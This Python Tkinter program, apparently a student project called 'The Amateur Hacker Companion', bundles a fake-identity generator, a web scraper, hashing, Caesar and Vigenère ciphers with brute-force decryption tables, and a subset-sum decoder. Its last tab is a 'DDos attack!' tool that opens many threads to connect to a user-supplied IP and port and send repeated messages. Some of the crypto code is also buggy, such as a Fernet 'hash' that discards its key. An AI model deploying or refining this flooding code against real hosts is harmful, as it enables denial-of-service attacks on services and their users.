from faker import Faker
import requests
import hashlib
from cryptography.fernet import Fernet
import socket
import sys
import threading
from tkinter import *
from tkinter import ttk
import tkinter.scrolledtext as scrolledtext
import re
import numpy as np


# create fake data using faker
def createFakeInfo(choice):
    fake = Faker(choice)
    name = fake.name()
    address = fake.address()
    email = fake.safe_email()
    country = fake.country()
    list = [name, address, email, country]
    return list


# create fake data windows and display fake data
def fakedata_click():
    lang = clicked.get()
    person = createFakeInfo(lang)

    name = "".join(person[0])
    address = "".join(person[1])
    email = "".join(person[2])
    country = "".join(person[3])

    window2 = Tk()
    window2.configure(bg="#F0F8FF")
    window2.geometry("300x300")
    window2.title("Details")
    window2.resizable(False, False)

    name_lbl = Label(window2, text="Full name: ", fg="blue", bg="#F0F8FF")
    name_lbl.place(x=5, y=0)
    name_txt = Text(window2, width=25, height=1, bg="#F0F8FF")
    name_txt.insert("1.0", name)
    name_txt.place(x=70, y=0)

    address_lbl = Label(window2, text="Address: ", fg="blue", bg="#F0F8FF")
    address_lbl.place(x=5, y=20)
    address_txt = Text(window2, width=25, height=2, bg="#F0F8FF")
    address_txt.insert("1.0", address)
    address_txt.place(x=70, y=20)

    email_lbl = Label(window2, text="Email: ", fg="blue", bg="#F0F8FF")
    email_lbl.place(x=5, y=60)
    email_txt = Text(window2, width=25, height=1, bg="#F0F8FF")
    email_txt.insert("1.0", email)
    email_txt.place(x=70, y=60)

    country_lbl = Label(window2, text="Country: ", fg="blue", bg="#F0F8FF")
    country_lbl.place(x=5, y=80)
    country_txt = Text(window2, width=25, height=1, bg="#F0F8FF")
    country_txt.insert("1.0", country)
    country_txt.place(x=70, y=80)

    exit_btn = Button(window2, text="Close window", command=window2.destroy, bg="#87CEFA")
    exit_btn.place(x=100, y=110)


# get html from url textbox,
def getHTML():
    website = searchWeb_txt.get("1.0", "end-1c")  # take url from textbox
    if website == "":
        return ""
    result = requests.get(website)
    htmlpage = result.text
    return htmlpage


# search keyword in a website given its URL
def searchWordInWeb():
    url_empty_lbl.place_forget()
    html_page = getHTML()
    #print(html_page)
    if html_page == "":
        searchWeb_txt.focus()
        url_empty_lbl.place(x= 160, y=53)
        return
    keyword = searchWeb_keyword.get("1.0", "end-1c")  # take key word from textbox
    if keyword == "":
        searchWeb_keyword.focus()
        url_empty_lbl.place(x= 345, y=53)
        return
    lst = []  # list for key word indexes in text
    for i in range(0, len(html_page)):
        resultSub = html_page.find(keyword, i, i + len(keyword))
        if resultSub != -1:
            lst.append(resultSub)
            i = i + len(keyword)
    search_res = " ".join(str(e) for e in lst)
    result_txt = Text(frame2, width=70, height=4, bg="#F0F8FF")
    result_txt.place(x=5, y=100)
    if search_res == "":
        result_txt.insert(END, "the keyword " + keyword + " does not appear in the website")
        return
    result_txt.insert(END, "the keyword " + keyword + " appears at the following indexes:" + "\n" + search_res)


# show html in new window
def showHTML():
    url_empty_lbl.place_forget()
    htmlpage = getHTML()
    if htmlpage == "":
        searchWeb_txt.focus()
        url_empty_lbl.place(x= 160, y=53)
        return
    window = Tk()
    window.title('HTML inspection')
    window.geometry("2000x2000")

    scroll = Scrollbar(window)
    scroll.pack(side=RIGHT, fill=Y)

    html_text = Text(window, width=230, height=300, yscrollcommand=scroll.set)
    html_text.config(wrap=WORD)
    html_text.place(x=5, y=7)

    scroll.config(command=html_text.yview)
    html_text.insert(END, htmlpage)


# choose between 2 encryption options
def encryptSelect():
    hashFunction__res_txt.delete("1.0", "end")
    str = hashFunction_txt.get("1.0", "end")
    choice = clicked1.get()
    msg = ""
    if choice == 'sha-256':
        msg = encryptMessageSHA(str)
    if choice == 'Fernet':
        msg = encryptMessageFernet(str)
    hashFunction_result_lbl = Label(frame3, text="Encoded text:", fg="blue", font=("arial", 10, "bold")).place(x=0,
                                                                                                               y=121)
    hashFunction__res_txt.place(x=5, y=150)
    hashFunction__res_txt.insert("1.0", "Encrypted message using " + choice + ":\n")
    hashFunction__res_txt.insert("2.0", msg)


#  encrypt with hashing function with sha-256
def encryptMessageSHA(str):
    sha_signature = hashlib.sha256(str.encode()).hexdigest()
    return sha_signature


# encrypt with hashing function with fernet
def encryptMessageFernet(str):
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    cipher_text = cipher_suite.encrypt(str.encode())
    return cipher_text


# cyclic encryption of a message with caesar cipher algorithm (encrypt message from textbox)
def caesarCipher():
    caesar_enc_txt.delete("1.0", "end-1c")  # first, delete text from encrypted message textbox every button click
    caesar_offset_empty_lbl.place_forget()
    caesar_offset_isntdigit_lbl.place_forget()
    offset = caesar_offset_ent.get()
    message = caesarCode_txt.get("1.0", 'end-1c')
    result = ""
    if offset == "":
        caesar_offset_ent.focus()
        caesar_offset_empty_lbl.place(x=420, y=50)
        return
    elif not offset.isdigit():
        caesar_offset_isntdigit_lbl.focus()
        caesar_offset_isntdigit_lbl.place(x=420, y=50)
        return
    # transverse the plain text
    caesar_enc_shifts = Button(frame4, text="create shifts table", bg="#B0C4DE",
                               command=caesar_click)  # shifts for encrypted message
    caesar_enc_shifts.place(x=420, y=145)
    for char in message:
        # several chars that will be accepted as is
        if char == ' ' or char == '\n' or char == ':' or char == ';' or char == '.' or char == '-':
            result += char
        # Encrypt uppercase characters in plain text
        elif char.isupper():
            result += chr((ord(char) + int(offset) - 65) % 26 + 65)
        # Encrypt lowercase characters in plain text
        else:
            result += chr((ord(char) + int(offset) - 97) % 26 + 97)
    caesar_enc_txt.insert("1.0", result)


# decrypting without a given key to show the possible outcome of each key
def caesarCipherDecrypt(text):
    shiftsTable = ""
    i = 0
    offset = 0
    while i < 26:
        # transverse the encrypted text
        attempt = ""
        for char in text:
            # several chars that will be accepted as is
            if char == ' ' or char == '\n' or char == ':' or char == ';' or char == '.' or char == '-':
                attempt += char
            # Decrypt uppercase characters in encrypted text
            elif char.isupper():
                attempt += chr((ord(char) - offset - 65) % 26 + 65)
            # Decrypt lowercase characters in encrypted text
            else:
                attempt += chr((ord(char) - offset - 97) % 26 + 97)
        # print("Offset of", offset, attempt)
        tempStr = "Offset of " + str(offset) + " " + attempt + "\n"
        shiftsTable = shiftsTable + tempStr
        i += 1
        offset += 1
    # print(shiftsTable)
    return shiftsTable


# create new window for shift hashtable
def caesar_click():
    encryptedMessage = caesar_enc_txt.get("1.0", "end-1c")
    shiftsTable = caesarCipherDecrypt(encryptedMessage)

    window = Tk()
    window.geometry("600x600")
    window.title("shifts table")
    window.resizable(False, False)

    shifttbl_lbl = Label(window, text="Shifts table for the encrypted message: " + encryptedMessage, fg="blue",
                         font=("arial", 10, "bold"))
    shifttbl_lbl.place(x=5, y=5)
    shifttbl_txt = Text(window, width=60, height=30, bg="#F0F8FF")
    shifttbl_txt.insert("1.0", shiftsTable)
    shifttbl_txt.place(x=5, y=30)


# vigenere encryption
def encrypt_vigenere():
    VigenereCode_enc_txt.delete("1.0", "end-1c")
    VigenereCode_empty_lbl.place_forget()
    VigenereCode_isntdigit_lbl.place_forget()
    text = VigenereCode_txt.get("1.0", 'end-1c')
    key = VigenereCode_key_txt.get("1.0", 'end-1c')
    jump = VigenereCode_jump_txt.get("1.0", 'end-1c')
    result = ""
    if key == "":
        VigenereCode_key_txt.focus()
        VigenereCode_empty_lbl.place(x=420, y=55)
        return
    if jump == "":
        VigenereCode_jump_txt.focus()
        VigenereCode_empty_lbl.place(x=470, y=55)
        return
    if not key.isdigit():
        VigenereCode_isntdigit_lbl.focus()
        VigenereCode_isntdigit_lbl.place(x=420, y=55)
        # return
    if not jump.isdigit():
        VigenereCode_isntdigit_lbl.focus()
        VigenereCode_isntdigit_lbl.place(x=420, y=55)
    Vigenere_enc_shifts = Button(frame5, text="create shifts table", bg="#B0C4DE", command=vigenere_click)  # clear button for encrypted message
    Vigenere_enc_shifts.place(x=420, y=145)
    # traverse text
    for i in range(len(text)):
        char = text[i]
        if char == ' ' or char == '' or char == '\n' or char == ':' or char == ';' or char == '.' or char == '-':
            result += char
        # Encrypt uppercase characters
        if (char.isupper()):
            # chr is to turn int to char by ASCII table; ord is to do the opposite
            # 26- letters in English alphabet; 65- ASCII value of 'A', 97 -ASCII value of 'a'
            result += chr((ord(char) + int(key) + (int(jump) * i) - 65) % 26 + 65)
        # Encrypt lowercase characters
        else:
            result += chr((ord(char) + int(key) + (int(jump) * i) - 97) % 26 + 97)
    VigenereCode_enc_txt.insert("1.0", result)


# The only difference in decrypt is - (minus) instead of + (plus) of the key
def decrypt_vigenere(text):
    result = ""
    shiftsTable= ""
    #return shiftsTable
    for key in range(26):
        for jump in range(26):
            print(key,jump)
            result = ""
            for i in range(len(text)):  # key
                char = text[i]
                if char == ' ' or char == '' or char == '\n' or char == ':' or char == ';' or char == '.' or char == '-':
                    result += char
                if (char.isupper()):
                    print(ord(char), int(key))
                    result += chr((ord(char) - int(key) - (int(jump) * i) - 65) % 26 + 65)
                else:
                    result += chr((ord(char) - int(key) - (int(jump) * i) - 97) % 26 + 97)
            print(result)
            tempStr = "key of " + str(key) + " and jump "+ str(jump) + " " + result + "\n"
            shiftsTable = shiftsTable + tempStr

    return shiftsTable


# create new window for shift hashtable
def vigenere_click():
    encryptedMessage = VigenereCode_enc_txt.get("1.0", "end-1c")
    shiftsTable = decrypt_vigenere(encryptedMessage)

    window = Tk()
    window.geometry("700x900")
    window.title("shifts table")
    window.resizable(False, False)

    shifttbl_lbl = Label(window, text="Shifts table for the encrypted message: " + encryptedMessage, fg="blue",
                         font=("arial", 10, "bold"))
    shifttbl_lbl.place(x=5, y=5)
    shifttbl_txt = scrolledtext.ScrolledText(window, width=80, height=53, bg="#F0F8FF")
    shifttbl_txt.insert("1.0", shiftsTable)
    shifttbl_txt.place(x=5, y=30)



def subsetSums(subSums,grCount, arr, l, r, sum=0):
    # Print current subset
    if l > r:
        subSums[grCount].append(sum)
        return

    # Subset including arr[l]
    subsetSums(subSums,grCount,arr, l + 1, r, sum + arr[l])

    # Subset excluding arr[l]
    subsetSums(subSums,grCount,arr, l + 1, r, sum)

    return subSums


def commonElements(arr):
    # initialize result with first array as a set
    result = set(arr[0])

    for currSet in arr[1:]:
        result.intersection_update(currSet)

    return list(result)


def findPlainText(cypher, n, m, d):
    groupCount = 0
    groups = [(cypher[i:i + d]) for i in range(0, len(cypher), d)]
    groups.remove('\n')
    groupsAsInt = list(map(int, groups))

    dividedArray = np.array_split(groupsAsInt, n)
    subSums=[]
    for i in range(n):
        subSums.append([])

    for array in dividedArray:
        subsetSums(subSums,groupCount, array, 0, len(array) - 1)
        groupCount=1+groupCount

    return commonElements(subSums)


def msspPressed():
    cyphert = MSSP_txt.get("1.0", "end")
    m = int(m_txt.get())
    n = int(n_txt.get())
    d = int(d_txt.get())

    plainText=findPlainText(cyphert, n, m, d)
    if plainText[0] == 0:
        plainText.pop(0)
    PlainText_enc_txt.insert("1.0",plainText)


ip = 'localhost'
port = 80
msg = 'hello'
ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
class myThread(threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter

    def run(self):
        print("Starting " + self.name)
        attack(ip, port, msg, self.threadID)
        print("Exiting " + self.name)


def attack(ip, port, msg, thread_id):
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect the socket to the port where the server is listening
    server_address = (ip, port)
    print(sys.stderr, 'connecting to %s port %s' % server_address)
    sock.connect(server_address)
    try:
        # Send data
        threadmsg = 'Thread-', thread_id, ':', msg;
        message = str.encode(str(threadmsg))
        print(sys.stderr, 'thread-', thread_id, 'sending "%s"' % message)
        sock.sendall(message)
        # Look for the response
        amount_received = 0
        amount_expected = len(message)
        while amount_received < amount_expected:
            data = sock.recv(16)
            amount_received += len(data)
            print(sys.stderr, 'received "%s"' % data)
    finally:
        print(sys.stderr, 'closing socket')
        sock.close()


# initiate DDos attack
def ddosAttack_click():
    global ip
    global port
    global msg
    invalid_port_lbl.place_forget()
    invalid_ip_lbl.place_forget()
    empty_lbl.place_forget()
    ip = ip_txt.get()
    port = int(port_txt.get())
    if not re.fullmatch(ip_pattern, ip) and ip != "localhost":
        ip_txt.focus()
        invalid_ip_lbl.place(x=5, y=48)
        return
    elif ip == "":
        ip_txt.focus()
        empty_lbl.place(x=5, y=48)
        return
    if not 0 <= port <= 65535:
        port_txt.focus()
        invalid_port_lbl.place(x=150, y=48)
        return
    elif port == "":
        port_txt.focus()
        empty_lbl.place(x=150, y=48)
        return
    msg = text_txt.get("1.0", "end")
    threadCount = int(threads_num_txt.get())
    threads_quantity = int(threads_txt.get())
    i = 0
    # Create new threads
    for i in range(threadCount):
        thread = myThread(i, "Thread-"+str(i)+"", i)
        thread.start()
    while i < threads_quantity:
        # Start new Threads
        thread.run()
        i = i + 1
    print("Exiting Main Thread")


#  main for GUI elements
if __name__ == '__main__':
    # main GUI window
    window = Tk()
    window.title("The Amateur Hacker Companion")

    # Center the window
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    x_cordinate = int((screen_width / 2) - (700 / 2))
    y_cordinate = int((screen_height / 2) - (800 / 2))
    window.geometry("{}x{}+{}+{}".format(700, 400, x_cordinate, y_cordinate))
    window.resizable(False, False)

    # Top Frame
    TopFrame = ttk.Frame(window)
    TopFrame.configure()
    TopFrame.pack(side=TOP)
    welcome_lbl = Label(TopFrame, text="The best hacking companion app for 2023", fg="#a7e4e8",
                        font="Helvetica 16 bold", relief=RAISED, bg="#098530")
    welcome_lbl.pack()

    # Middle Frame
    MiddleFrame = ttk.Notebook(window)
    MiddleFrame.pack()

    ######## for faker
    # Create fake data source (english default, italian, hebrew, japanese) (with faker library)
    frame1 = ttk.Frame(MiddleFrame, width=600, height=200)
    MiddleFrame.add(frame1, text='Create fake personal data')

    fakeData_lbl = Label(frame1, text="Create fake personal data(choose the preferred language from the list):",
                         fg="blue", font=("arial", 10, "bold")).place(x=0, y=5)
    fakedata_btn = Button(frame1, text="create fake data", bg="#B0C4DE", command=fakedata_click).place(x=471, y=35)
    fakedata_options = ["en_US", "it_IT", "he_IL", "jp_JP"]
    clicked = StringVar()
    clicked.set(fakedata_options[0])
    drop = OptionMenu(frame1, clicked, *fakedata_options)
    drop.place(x=470, y=0)

    ######## for searching on web
    # print html (from given URL) + search word from a website (with requests library)
    frame2 = ttk.Frame(MiddleFrame, width=600, height=200)
    MiddleFrame.add(frame2, text='Find keyword in site')
    searchWeb_lbl = Label(frame2, text="Enter the URL you wish to scrape(include http(s)://):", fg="blue",
                          font=("arial", 10, "bold")).place(x=0, y=5)
    searchWeb_txt = Text(frame2, width=40, height=1, bg="#F0F8FF")
    searchWeb_txt.place(x=5, y=30)

    searchWeb_keyword_lbl = Label(frame2, text="Keyword to search:", fg="blue", font=("arial", 10, "bold")).place(x=350,y=5)
    searchWeb_keyword = Text(frame2, width=15, height=1, bg="#F0F8FF")
    searchWeb_keyword.place(x=350, y=30)

    searchWeb_btn = Button(frame2, text="Scrape URL", bg="#B0C4DE", command=searchWordInWeb).place(x=480, y=25)
    display_html_btn = Button(frame2, text="Display source code", bg="#B0C4DE", command=showHTML).place(x=40, y=55)
    url_empty_lbl = Label(frame2, text="*This field cannot be empty", fg="red", font=("arial", 10, "bold"))

    ######## for hash function encryptions
    # encryption: input string -> output sha-256/fernet
    frame3 = ttk.Frame(MiddleFrame, width=600, height=200)
    MiddleFrame.add(frame3, text='hash function')
    hashFunction_lbl = Label(frame3, text="encode with hash function:", fg="blue", font=("arial", 10, "bold")).place(x=0, y=5)
    hashFunction_txt = Text(frame3, width=50, height=5, bg="#F0F8FF")
    hashFunction_txt.place(x=5, y=30)
    hashFunction2_lbl = Label(frame3, text="Encryption options:", fg="blue", font=("arial", 10, "bold")).place(x=410,y=5)

    hashFunction__res_txt = Text(frame3, width=50, height=5, bg="#F0F8FF")
    encrypt_options = ["sha-256", "Fernet"]
    clicked1 = StringVar()
    clicked1.set(encrypt_options[0])

    drop = OptionMenu(frame3, clicked1, *encrypt_options)
    drop.place(x=420, y=30)

    hashFunction_btn = Button(frame3, text="Encrypt message", bg="#B0C4DE", command=encryptSelect).place(x=420, y=70)

    ######## for caesar cipher
    # caesar encryption: input encrypted caesar string-> output-> hist table
    frame4 = ttk.Frame(MiddleFrame, width=600, height=300)
    MiddleFrame.add(frame4, text='caesar encryption')
    caesarCode_lbl = Label(frame4, text="Enter a message to encrypt with Caesar cipher:", fg="blue",
                           font=("arial", 10, "bold")).place(x=0, y=5)
    caesarCode_txt = Text(frame4, width=50, height=5, bg="#F0F8FF")
    caesarCode_txt.place(x=5, y=30)

    caesar_offset_lbl = Label(frame4, text="cipher offset (digit):", fg="blue", font=("arial", 10, "bold")).place(x=420,y=5)
    caesar_offset_ent = Entry(frame4, width=10, bg="#F0F8FF")
    caesar_offset_ent.place(x=420, y=30)
    caesar_offset_empty_lbl = Label(frame4, text="*This field cannot be empty", fg="red", font=("arial", 10, "bold"))
    caesar_offset_isntdigit_lbl = Label(frame4, text="*only digits allowed", fg="red", font=("arial", 10, "bold"))

    caesar_encrypted_lbl = Label(frame4, text="Encrypted message:", fg="blue", font=("arial", 10, "bold")).place(x=5,y=115)

    caesar_enc_txt = Text(frame4, width=50, height=5, bg="#F0F8FF")
    caesar_enc_txt.place(x=5, y=140)


    caesar_btn = Button(frame4, text="Encrypt message", bg="#B0C4DE", command=caesarCipher).place(x=420, y=75)

    ######## vigener attack: input encrypted visiner string -> output hist table + full jumps 
    frame5 = ttk.Frame(MiddleFrame, width=600, height=200)
    MiddleFrame.add(frame5, text='Vigenère cipher encryption')
    VigenereCode_lbl = Label(frame5, text="Enter a message to encrypt with Vigenère cipher:", fg="blue",
                             font=("arial", 10, "bold")).place(x=0, y=5)
    VigenereCode_txt = Text(frame5, width=50, height=5, bg="#F0F8FF")
    VigenereCode_txt.place(x=5, y=30)
    VigenereCode_key_lbl = Label(frame5, text="Enter key:", fg="blue", font=("arial", 10, "bold")).place(x=415, y=15)
    VigenereCode_key_txt = Text(frame5, width=8, height=1, bg="#F0F8FF")
    VigenereCode_key_txt.place(x=417, y=38)
    VigenereCode_jump_lbl = Label(frame5, text="Enter jump:", fg="blue", font=("arial", 10, "bold")).place(x=490, y=15)
    VigenereCode_jump_txt = Text(frame5, width=8, height=1, bg="#F0F8FF")
    VigenereCode_jump_txt.place(x=492, y=38)
    VigenereCode_enc_lbl = Label(frame5, text="Encrypted message:", fg="blue", font=("arial", 10, "bold")).place(x=0,y=115)
    VigenereCode_enc_txt = Text(frame5, width=50, height=5, bg="#F0F8FF")
    VigenereCode_enc_txt.place(x=5, y=140)
    VigenereCode_empty_lbl = Label(frame5, text="*This field cannot be empty", fg="red", font=("arial", 10, "bold"))
    VigenereCode_isntdigit_lbl = Label(frame5, text="*This field cannot be empty", fg="red", font=("arial", 10, "bold"))

    VigenereCode_btn = Button(frame5, text="Encrypt message", bg="#B0C4DE", command=encrypt_vigenere).place(x=420, y=75)

    ######## encryption MSSP: input-> cypherText + m n d -> output plaintext
    frame6 = ttk.Frame(MiddleFrame, width=600, height=200)
    MiddleFrame.add(frame6, text='MSSP')
    MSSP_lbl = Label(frame6, text="Enter the cypherText:", fg="blue", font=("arial", 10, "bold")).place(x=0, y=5)
    MSSP_txt = Text(frame6, width=50, height=5, bg="#F0F8FF")
    MSSP_txt.place(x=5, y=30)

    m_lbl = Label(frame6, text="m:", fg="blue", font=("arial", 10, "bold")).place(x=430, y=5)
    n_lbl = Label(frame6, text="n:", fg="blue", font=("arial", 10, "bold")).place(x=470, y=5)
    d_lbl = Label(frame6, text="d:", fg="blue", font=("arial", 10, "bold")).place(x=510, y=5)
    m_txt = Entry(frame6, width=5, bg="#F0F8FF")
    m_txt.place(x=430, y=30)
    n_txt = Entry(frame6, width=5, bg="#F0F8FF")
    n_txt.place(x=470, y=30)
    d_txt = Entry(frame6, width=5, bg="#F0F8FF")
    d_txt.place(x=510, y=30)

    PlainText_enc_lbl = Label(frame6, text="Plain text:", fg="blue", font=("arial", 10, "bold")).place(x=0,y=115)
    PlainText_enc_txt = Text(frame6, width=50, height=5, bg="#F0F8FF")
    PlainText_enc_txt.place(x=5, y=140)

    PlainTextCode_btn = Button(frame6, text="get plaintext", bg="#B0C4DE", command=msspPressed).place(x=470, y=70)

    ######## ddos attack: input-> ip, port, massage, threads number, threads number of times
    frame7 = ttk.Frame(MiddleFrame, width=600, height=200)
    MiddleFrame.add(frame7, text='DDos')

    ip_lbl = Label(frame7, text="IP:", fg="blue", font=("arial", 10, "bold")).place(x=5, y=10)
    port_lbl = Label(frame7, text="port:", fg="blue", font=("arial", 10, "bold")).place(x=150, y=10)
    text_lbl = Label(frame7, text="massage:", fg="blue", font=("arial", 10, "bold")).place(x=5, y=70)

    threads_lbl = Label(frame7, text="threads number:", fg="blue", font=("arial", 10, "bold")).place(x=300, y=10)
    threads_num_lbl = Label(frame7, text="threads run time:", fg="blue", font=("arial", 10, "bold")).place(x=450, y=10)

    ip_txt = Entry(frame7, width=20, bg="#F0F8FF")
    ip_txt.place(x=5, y=30)
    port_txt = Entry(frame7, width=20, bg="#F0F8FF")
    port_txt.place(x=150, y=30)
    text_txt = Text(frame7, width=40, height=3, bg="#F0F8FF")
    text_txt.place(x=5, y=90)

    threads_txt = Entry(frame7, width=20, bg="#F0F8FF")
    threads_txt.place(x=300, y=30)
    threads_num_txt = Entry(frame7, width=20, bg="#F0F8FF")
    threads_num_txt.place(x=450, y=30)

    DDos_btn = Button(frame7, text="DDos attack!", bg="#B0C4DE", command=ddosAttack_click).place(x=350, y=90)
    invalid_port_lbl = Label(frame7, text="*Port number must be between 0 - 65535", fg="red", font=("arial", 10, "bold"))
    invalid_ip_lbl = Label(frame7, text="*Invalid IP syntax", fg="red",font=("arial", 10, "bold"))
    empty_lbl = Label(frame7, text="*This field cannot be empty", fg="red",font=("arial", 10, "bold"))

    # bottom Frame
    BottomFrame = Frame(window)
    BottomFrame.pack(side=BOTTOM)
    credit_Lable = Label(BottomFrame, text="© Alina Bloshenko, Barak Lisker, Or Nagar, Raihana Neserat ")
    credit_Lable.pack()

    ######### END
    window.mainloop()
    